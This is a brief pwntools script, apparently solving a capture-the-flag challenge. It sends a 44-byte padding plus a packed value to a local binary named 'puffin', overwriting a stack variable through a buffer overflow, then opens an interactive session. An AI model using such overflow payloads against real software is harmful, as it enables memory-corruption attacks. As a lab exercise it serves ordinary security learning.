from pwn import *

# Start the process
p = process('./puffin')

# Craft the payload
payload = b'A' * 44  # Fill the buffer
payload += p32(1)    # Overwrite local_c with 1

# Send the payload
p.sendline(payload)

# Interact with the process to keep it running
p.interactive()